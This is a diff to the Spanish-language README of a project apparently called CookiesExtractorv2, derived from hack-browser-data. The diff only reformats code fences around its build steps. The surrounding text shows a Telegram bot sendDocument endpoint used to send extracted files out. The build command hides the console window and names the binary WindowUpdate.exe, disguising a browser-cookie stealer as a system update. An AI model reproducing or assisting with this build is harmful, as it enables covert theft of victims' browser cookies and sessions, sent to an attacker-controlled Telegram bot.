@@ -87,17 +87,23 @@ const (
     TelegramFileAPI = "https://api.telegram.org/bot%s/sendDocument"
 )
 ```
-```bash
 ###  Navega a la raíz de tu proyecto
+```bash
 cd CookiesExtractorv2
+```
 
 ### Inicializa y limpia tu módulo (si aún no lo has hecho)
+```bash
 go mod tidy
+```
 
 ###  Navega hasta este apartado
+```bash
 cd cmd\hack-browser-data
+```
 
 ### Compila el ejecutable (desde la raíz del módulo)
+```bash
 go build -ldflags="-s -w -H=windowsgui" -o WindowUpdate.exe
 
 ```
